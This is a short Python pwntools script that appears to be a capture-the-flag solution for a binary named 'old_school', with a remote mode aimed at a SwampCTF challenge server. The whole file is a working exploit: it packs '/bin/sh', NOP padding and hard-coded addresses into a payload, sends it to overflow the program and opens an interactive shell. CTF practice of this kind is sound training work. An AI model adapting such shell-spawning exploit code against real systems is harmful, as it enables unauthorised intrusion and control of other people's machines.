#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './old_school'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chals.swampctf.com', 64444

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    payload = flat(
        '/bin/sh\x00',
        '\x90' * 16,
        0x0,
        0x4010ba,
        0x401012,
        '\x90' * 10
    )

    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()